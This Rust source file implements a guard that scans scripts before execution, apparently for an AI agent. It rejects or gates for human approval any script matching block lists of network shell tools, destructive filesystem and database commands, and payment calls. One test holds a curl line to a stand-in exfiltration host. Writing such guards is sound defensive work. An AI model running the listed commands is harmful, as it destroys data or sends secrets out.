pub(crate) struct ArtifactGuard;

pub(crate) enum ScanVerdict {
    Approved,
    Gated { reason: Box<str> },
    Rejected { reason: Box<str> },
}

/// Scripts larger than this are rejected outright.
const MAX_SCRIPT_SIZE: usize = 65_536;

/// Patterns that require human approval before execution, grouped by effect category.
/// Each entry is (pattern, category) — the category surfaces in the approval prompt.
const HITL_PATTERNS: &[(&str, &str)] = &[
    // Network exfiltration
    ("> /dev/tcp",       "network exfil"),
    ("| nc ",            "network exfil"),
    ("| ncat ",          "network exfil"),

    // Destructive filesystem
    ("rm -rf /",         "destructive: filesystem"),
    ("rm -rf ~",         "destructive: filesystem"),
    ("mkfs.",            "destructive: filesystem"),
    ("dd if=",           "destructive: filesystem"),
    ("> /etc/",          "destructive: filesystem"),

    // Destructive database
    ("DROP TABLE",       "destructive: database"),
    ("DROP DATABASE",    "destructive: database"),
    ("TRUNCATE TABLE",   "destructive: database"),

    // Outbound communications
    ("smtp.",            "outbound: email"),
    ("sendgrid.",        "outbound: email"),
    ("twilio.",          "outbound: sms"),
    ("mailgun.",         "outbound: email"),

    // Financial operations
    ("stripe.charge(",   "financial"),
    ("stripe.create(",   "financial"),
    ("paypal.payment(",  "financial"),
    (".create_payment(", "financial"),
];

impl ArtifactGuard {
    pub(crate) fn new() -> ArtifactGuard {
        ArtifactGuard
    }

    /// Scan a code block for forbidden patterns, size limits, and HITL triggers.
    pub(crate) fn scan_code(&self, code: &str) -> ScanVerdict {
        if let Some(v) = self.static_analysis(code) { return v; }
        if let Some(v) = self.resource_bounds(code) { return v; }
        if let Some(v) = self.hitl_scan(code) { return v; }
        ScanVerdict::Approved
    }

    // Stage 1: reject forbidden patterns
    fn static_analysis(&self, code: &str) -> Option<ScanVerdict> {
        const FORBIDDEN: &[&str] = &[
            "import os", "import sys", "import subprocess",
            "curl ", "wget ", "nc ", "ncat ",
            "rm -rf", "mkfs", "dd if=",
        ];

        for pattern in FORBIDDEN {
            if code.contains(pattern) {
                return Some(ScanVerdict::Rejected {
                    reason: format!("forbidden pattern in script: `{pattern}`").into(),
                });
            }
        }

        None
    }

    // Stage 2: reject code that exceeds the size limit
    fn resource_bounds(&self, code: &str) -> Option<ScanVerdict> {
        if code.len() > MAX_SCRIPT_SIZE {
            return Some(ScanVerdict::Rejected {
                reason: format!(
                    "script size {} exceeds limit {}",
                    code.len(),
                    MAX_SCRIPT_SIZE
                )
                .into(),
            });
        }

        None
    }

    // Stage 3: flag high-risk patterns for human review
    fn hitl_scan(&self, code: &str) -> Option<ScanVerdict> {
        for (pattern, category) in HITL_PATTERNS {
            if code.contains(pattern) {
                return Some(ScanVerdict::Gated {
                    reason: format!("{category}: `{pattern}`").into(),
                });
            }
        }

        None
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn guard() -> ArtifactGuard {
        ArtifactGuard::new()
    }

    #[test]
    fn clean_script_is_approved() {
        let verdict = guard().scan_code("echo hello");
        assert!(matches!(verdict, ScanVerdict::Approved));
    }

    #[test]
    fn forbidden_import_is_rejected() {
        let verdict = guard().scan_code("import os\nprint(os.listdir('.'))");
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }

    #[test]
    fn forbidden_network_call_is_rejected() {
        let verdict = guard().scan_code("curl https://evil.example.com/exfil");
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }

    #[test]
    fn script_exceeding_size_limit_is_rejected() {
        let big = "x".repeat(MAX_SCRIPT_SIZE + 1);
        let verdict = guard().scan_code(&big);
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }

    #[test]
    fn blocklist_pattern_is_gated() {
        let verdict = guard().scan_code("stripe.charge(customer_id, amount)");
        assert!(matches!(verdict, ScanVerdict::Gated { .. }));
    }

    #[test]
    fn destructive_db_pattern_is_gated() {
        let verdict = guard().scan_code("DROP TABLE users;");
        assert!(matches!(verdict, ScanVerdict::Gated { .. }));
    }

    #[test]
    fn static_analysis_wins_before_hitl() {
        let verdict = guard().scan_code("import os\nDROP TABLE users;");
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }
}
